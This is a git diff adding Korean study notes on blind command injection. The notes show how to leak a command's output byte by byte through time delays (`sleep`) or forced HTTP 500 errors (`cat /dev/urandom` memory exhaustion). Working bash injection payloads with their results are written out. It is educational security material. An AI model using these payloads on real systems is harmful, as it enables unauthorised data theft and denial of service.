@@ -108,3 +108,48 @@ Command Injection 취약점이 발생하지만 실행한 명령어의 결과가 
             - 해당 디렉터리를 사용하지 않는 환경에서도 static 디렉토리를 생성하고 파일을 생성하면 그 결과를 확인할 수 있음 → static 디렉터리를 생성하고, ```id``` 명령어의 실행 결과를 result.txt에 저장하고 있음(```static/result.txt``` 페이지를 방문하면 실행 결과 확인 가능)
 
 <br/><br/>
+
+### 네트워크의 인/아웃 바운드의 제한이 걸려 있는 상황에서 참/거짓 비교문으로 데이터를 알아내는 방법
+공격 대상 서버에서 네트워크 방화벽 규칙을 설정해 인/아웃 바운드에 제한이 걸려 있는 경우 셸을 이용한 공격은 불가능함 → 참/거짓 비교문으로 데이터를 알아내야 함
+
+<br/>
+
+* 지연 시간(sleep): 비교하는 값이 참일 경우 ```sleep``` 명령어를 실행해 지연 시간을 발생시켜 웹 애플리케이션에서 반환하는 속도를 이용하여 데이터를 획득하는 방법
+    - 명령어의 결과를 base64로 인코딩한 값을 한 바이트씩 비교하여 지연 발생 여부(참/거짓)을 통해 데이터를 알아냄
+        1. 명령어의 결과를 base64로 인코딩함
+            ```
+            id
+            /* id 명령어 실행 결과
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+            */
+
+            id | base64 -w 0
+            /* id 명령어 실행 결과를 base64로 인코딩한 결과
+            dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
+            */
+            ```
+        2. 인코딩하여 나온 값을 한 바이트씩 비교하는 Bash 스크립트를 작성하여 참이면 ```sleep``` 명령어를 실행하고, 아니라면 스크립트를 종료해 지연 시간 발생 여부로 데이터를 알아냄
+            ```bash
+            bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then sleep 2; fi;" # 결과: 2초 지연 발생 (true) → 첫번째 문자 d
+            bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then sleep 2; fi;" # 결과: 2초 지연 발생(true) → 두번째 문자 W
+            bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then sleep 2; fi;" # 결과: 지연 발생 X (false)
+            bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then sleep 2; fi;" # 결과: 2초 지연 발생(true) → 세번째 문자 l
+            ```
+
+<br/>
+
+* 에러 (DoS): 비교하는 값이 참일 경우에 시스템 에러(Internal Server Error, HTTP 500)을 발생시켜 에러 반환 여부를 통해 데이터를 획득하는 방법
+    - 시간을 지연시키는 방법이 불가능하거나 지연을 확인하기 어려운 경우에 사용할 수 있음
+        + 메모리를 많이 소모하는 명령어를 입력하는 등의 행위로 **Internal Server Error**를 발생시켜 참과 거짓을 판별함
+            - 메모리를 소모하는 방법은 다양하지만 제일 간단한 방법으로 ```cat /dev/urandom``` 명령어를 실행시켜 할당된 메모리를 초과했다는 에러를 발생시킴
+    - 명령어의 결과를 base64로 인코딩한 값을 한 바이트씩 비교하여 Internal Server Error 발생 여부(참/거짓)를 통해 데이터를 알아냄
+        1. 명령어의 결과를 base64로 인코딩함 (위의 과정과 동일)
+        2. 인코딩하여 나온 값을 한 바이트씩 비교하는 Bash 스크립트를 작성해 500(Internal Server Error, 서버 측 에러)이라면 참, 200(Success, 성공) 등이라면 거짓으로 판단함
+            ```bash
+            bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (첫번째 문자 d)
+            bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (두번째 문자 W)
+            bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then cat /dev/urandom; fi;" # 결과: 200(성공) → false
+            bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (세번재 문자 l)
+            ```
+
+<br/><br/><br/>
